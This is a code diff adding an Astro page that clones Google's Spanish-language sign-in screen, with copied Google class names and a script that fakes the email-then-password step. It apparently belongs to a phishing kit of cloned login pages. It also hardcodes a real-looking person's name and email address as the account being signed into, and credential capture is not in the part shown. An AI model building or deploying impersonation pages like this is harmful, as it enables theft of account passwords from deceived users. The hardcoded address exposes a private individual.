@@ -1,0 +1,152 @@
+---
+import Layout from "@/layouts/templates/microsoft/Layout.astro";
+
+import GooglePassword from "@/components/google-password.astro";
+import GoogleFooter from "@/components/google-footer.astro";
+import GooglePasswordButtons from "@/components/google-password-buttons.astro";
+import GooglePasswordHeader from "@/components/google-password-header.astro";
+
+import GoogleEmail from "@/components/google-email.astro";
+import GoogleEmailHeader from "@/components/google-email-header.astro";
+import GoogleEmailButtons from "@/components/google-email-buttons.astro";
+---
+
+<Layout title="Inicia sesión: Cuentas de Google">
+  <div class="S7xv8 LZgQXe">
+    <div class="TcuCfd NQ5OL" tabindex="null">
+      <div class="Ih3FE" aria-hidden="true">
+        <div
+          role="progressbar"
+          class="sZwd7c B6Vhqe qdulke jK7moc"
+          id="loading-indicator"
+        >
+          <div class="xcNBHc um3FLe"></div>
+          <div class="w2zcLc Iq5ZMc"></div>
+          <div class="MyvhI TKVRUb">
+            <span class="l3q5xe SQxu9c"></span>
+          </div>
+          <div class="MyvhI sUoeld">
+            <span class="l3q5xe SQxu9c"></span>
+          </div>
+        </div>
+      </div>
+
+      <div class="fAlnEc" id="yDmH0d">
+        <c-wiz class="A77ntc" jsmodel="hc6Ubd niKKCd">
+          <div class="Svhjgc">
+            <GoogleEmailHeader id="email-header-container" />
+            <GooglePasswordHeader
+              email="maizogabriel@gmail.com"
+              name="Gabriel Maizo"
+              id="password-header-container"
+              class="hidden"
+            />
+
+            <div class="UXFQgc">
+              <div class="qWK5J">
+                <div class="xKcayf">
+                  <div class="AcKKx">
+                    <GoogleEmail id="google-email-form" />
+                    <GooglePassword id="google-password-form" class="hidden" />
+                  </div>
+
+                  <div id="guest-mode-container">
+                    <div class="RDsYTb">
+                      <div class="dMNVAe">
+                        ¿No es tu ordenador? Usa el modo Invitado para iniciar
+                        sesión de forma privada.{" "}
+                        <a
+                          href="https://support.google.com/chrome/answer/6130773?hl=es"
+                          target="_blank"
+                        >
+                          Más información sobre cómo usar el modo Invitado
+                        </a>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div id="buttons-container" class={`JYXaTc `}>
+              <GoogleEmailButtons id="email-buttons-container" />
+              <GooglePasswordButtons
+                id="password-buttons-container"
+                class="hidden"
+              />
+            </div>
+          </div>
+          <c-data id="i5"></c-data>
+        </c-wiz>
+        <div id="ZCHFDb"></div>
+      </div>
+
+      <div class="kPY6ve hidden" id="loading-overlay" tabindex="0"></div>
+    </div>
+
+    <GoogleFooter />
+  </div>
+</Layout>
+
+<script>
+  // Función para manejar el envío del formulario de email
+  function handleEmailSubmit() {
+    // Mostrar el estado de carga
+    document
+      .getElementById("loading-indicator")
+      ?.classList.remove("qdulke", "jK7moc");
+    document.getElementById("loading-overlay")?.classList.remove("hidden");
+
+    // Esperar 1.5 segundos
+    setTimeout(() => {
+      // Ocultar el estado de carga
+      document
+        .getElementById("loading-indicator")
+        ?.classList.add("qdulke", "jK7moc");
+      document.getElementById("loading-overlay")?.classList.add("hidden");
+
+      // Cambiar a la vista de contraseña
+      document.getElementById("google-email-form")?.classList.add("hidden");
+      document
+        .getElementById("google-password-form")
+        ?.classList.remove("hidden");
+
+      document
+        .getElementById("email-header-container")
+        ?.classList.add("hidden");
+      document
+        .getElementById("password-header-container")
+        ?.classList.remove("hidden");
+
+      document
+        .getElementById("email-buttons-container")
+        ?.classList.add("hidden");
+      document
+        .getElementById("password-buttons-container")
+        ?.classList.remove("hidden");
+
+      document.getElementById("guest-mode-container")?.classList.add("hidden");
+
+      // Aplicar la clase lUWEgd al contenedor de botones
+      document.getElementById("buttons-container")?.classList.add("lUWEgd");
+    }, 1500);
+  }
+
+  // Agregar event listener al botón de siguiente en el formulario de email
+  document.addEventListener("DOMContentLoaded", () => {
+    // Buscar el botón dentro del componente GoogleEmailButtons
+    const nextButton = document.querySelector(
+      '#email-buttons-container button[type="submit"]',
+    );
+
+    if (nextButton) {
+      nextButton.addEventListener("click", (e) => {
+        e.preventDefault(); // Prevenir el envío del formulario
+        handleEmailSubmit();
+      });
+    }
+
+    // También podemos usar un evento personalizado para mayor flexibilidad
+    document.addEventListener("google-email-submit", handleEmailSubmit);
+  });
+</script>
